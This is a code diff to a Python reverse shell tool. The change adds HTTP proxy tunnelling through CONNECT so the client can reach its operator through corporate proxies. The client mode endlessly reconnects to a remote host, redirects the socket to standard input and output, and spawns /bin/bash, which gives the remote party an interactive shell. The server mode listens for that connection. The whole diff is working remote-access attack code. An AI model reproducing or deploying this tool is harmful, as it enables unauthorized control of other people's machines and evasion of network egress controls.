@@ -4,23 +4,48 @@ import sys
 import os
 import socket
 import select
+import argparse
+import time
+import urllib.parse
 import termios
 import fcntl
-import argparse
 import pty
-import time
 
 
-def connect(addr, port, shell):
+def get_proxy():
+  proxy = os.environ.get('http_proxy')
+
+  if proxy:
+    proxy = urllib.parse.urlparse(proxy).netloc
+
+    if ':' in proxy:
+      proxy = proxy.split(':')
+      return proxy[0], int(proxy[1])
+
+    return proxy, 80
+
+
+def connect(addr, port, shell, proxy):
   while True:
     try:
       with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
-        s.connect((addr, port))
+        if proxy is not None:
+          print('Connecting via proxy %s:%d to %s:%d' % (
+            proxy[0], proxy[1], addr, port))
+          s.connect(proxy)
+          s.send(str.encode('CONNECT %s:%d HTTP/1.1\r\nHost: %s:%d\r\n\r\n' % (
+            addr, port, addr, port)))
+
+        else:
+          print('Connecting directly to %s:%d' % (addr, port))
+          s.connect((addr, port))
+
         os.dup2(s.fileno(), 0)
         os.dup2(s.fileno(), 1)
         os.dup2(s.fileno(), 2)
         pty.spawn(shell)
-    except: pass
+
+    except Exception as e: print(e)
     time.sleep(1)
 
 
@@ -53,7 +78,7 @@ def handle(conn, addr):
     with NonblockingInput():
       while True:
         select.select([conn, sys.stdin.fileno()], [], [conn])
-    
+
         bytes = sys.stdin.buffer.read(int(1e6))
         if bytes: conn.send(bytes)
 
@@ -69,6 +94,7 @@ def handle(conn, addr):
 
 def listen(addr, port):
   s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+  s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
   s.bind((addr, port))
   s.listen(1)
 
@@ -78,12 +104,21 @@ def listen(addr, port):
 
 
 parser = argparse.ArgumentParser(description = 'Reverse shell server')
-parser.add_argument('-a', '--addr', default = '0.0.0.0', help = 'Server host name or IP')
-parser.add_argument('-p', '--port', default = 34672, type = int, help = 'Server port')
-parser.add_argument('-c', '--client', action = 'store_true', help = 'Client mode')
-parser.add_argument('-s', '--shell', default = '/bin/bash', help = 'Client shell')
+parser.add_argument('-a', '--addr', default = '0.0.0.0',
+                    help = 'Server host name or IP')
+parser.add_argument('-p', '--port', default = 34672, type = int,
+                    help = 'Server port')
+parser.add_argument('-c', '--client', action = 'store_true',
+                    help = 'Client mode')
+parser.add_argument('-d', '--direct', action = 'store_true',
+                    help = 'Ignore proxy settings')
+parser.add_argument('-s', '--shell', default = '/bin/bash',
+                    help = 'Client shell')
 args = parser.parse_args()
 
 
-if args.client: connect(args.addr, args.port, args.shell)
+if args.client:
+  proxy = None if args.direct else get_proxy()
+  connect(args.addr, args.port, args.shell, proxy)
+
 else: listen(args.addr, args.port)
